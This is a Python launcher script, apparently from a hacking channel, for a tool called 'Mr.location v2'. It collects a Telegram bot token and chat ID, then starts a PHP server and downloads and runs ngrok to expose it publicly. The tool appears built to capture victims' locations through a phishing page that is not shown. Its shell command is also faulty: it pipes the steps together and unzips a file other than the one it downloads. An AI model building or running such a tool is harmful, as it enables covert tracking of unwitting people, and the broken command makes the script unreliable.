#/usr/bin/env python3
# code by mrsploit
# mrlocation v2
# t.me/ZoneH

import os
os.system("clear")
print(''' \033[92m
                 '&&&&&&&'
                '&&&&&&&&&'
               '&&&&&&&&&&&'
               "&&&'   '&&&"
              "&&&&,   ,&&&&"    Mr.location v2
              "&&&&&&&&&&&&&"    --------------------
               "&&&&&&&&&&&"     t.me/ZoneH
                "&&&&&&&&&"
                 "&&&&&&&" 
                  "&&&&&"
                   "&&&"
                    "&"  \033[95m
    #####################################

''')
open('bot-data.txt', 'w').close()
token = input("Enter The Bot Token: ")
chat_id = input("Enter The Your Chat ID: ")
f = open("bot-data.txt", "a")
f.write(token+"$"+chat_id)
f.close()
os.system("php -S localhost:3333 | wget https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm.zip | unzip ngrok-stable-linux-386.zip | php -S 127.0.0.1:3333 | ./ngrok http 3333")


